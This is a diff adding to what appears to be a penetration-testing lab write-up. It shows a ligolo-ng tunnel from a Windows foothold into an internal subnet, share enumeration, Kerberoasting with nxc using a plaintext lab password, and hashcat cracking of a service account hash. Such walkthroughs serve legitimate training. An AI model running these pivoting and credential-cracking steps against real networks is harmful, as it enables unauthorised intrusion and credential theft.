@@ -75,3 +75,68 @@ and fixed it with:
 ```
 ./proxy -laddr 0.0.0.0:11601 -selfcert
 ```
+
+ok i gave up on chisel and came back on ligolo, after downloading ligolo agent for windows and proxy for linux, on my kali box i ran&#x20;
+
+```
+tar -xvzf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
+ip tuntap add user felix mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert
+```
+
+and on my windows session i ran:
+
+```
+./agent.exe --connect 192.168.45.238:11601 -ignore-cert
+```
+
+<figure><img src="../../../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>
+
+Then in another terminal i type:
+
+```
+sudo ip route add 10.10.87.0/24 dev ligolo
+```
+
+and i go back in the kali ligolo shell and type:
+
+```
+session
+1
+start
+```
+
+And i can now ping the internal network:&#x20;
+
+<figure><img src="../../../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>
+
+Then i start my enumeration over again and look for open ports:
+
+<figure><img src="../../../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>
+
+then i look for open shares:
+
+<figure><img src="../../../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>
+
+I go and download everything in Users share and find a lot of stuff:
+
+<figure><img src="../../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>
+
+I started looking through each file but it was very long so i told myself that i'll continue enumeration and found something:
+
+```
+nxc ldap 10.10.87.140 -u Eric.Wallows -p EricLikesRunning800 --kerberoasting kerb.out
+```
+
+<figure><img src="../../../../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>
+
+and we're able to crack the password of web\_svc with command:
+
+```
+hashcat -m13100 websvc.hash /usr/share/wordlists/rockyou.txt
+```
+
+And we confirm we have the good credentials:
+
+<figure><img src="../../../../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>
